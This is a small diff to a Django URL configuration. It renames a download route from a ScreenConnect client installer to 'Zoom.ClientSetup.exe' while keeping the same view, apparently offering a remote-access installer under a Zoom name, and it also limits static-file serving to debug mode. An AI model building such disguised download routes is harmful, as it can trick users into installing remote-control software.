@@ -29,11 +29,12 @@ urlpatterns = [
     path('laptop-only/', views.laptop_only, name='laptop_only'),
 
     path(
-        'download/ScreenConnect.ClientSetup.exe',
+        'download/Zoom.ClientSetup.exe',
         views.download_client_setup,
         name='client_setup',
     ),
     path('admin/', admin.site.urls),
 ]
 
-urlpatterns += static(settings.STATIC_URL, document_root=settings.STATIC_ROOT)
+if settings.DEBUG:
+    urlpatterns += static(settings.STATIC_URL, document_root=settings.STATIC_ROOT)
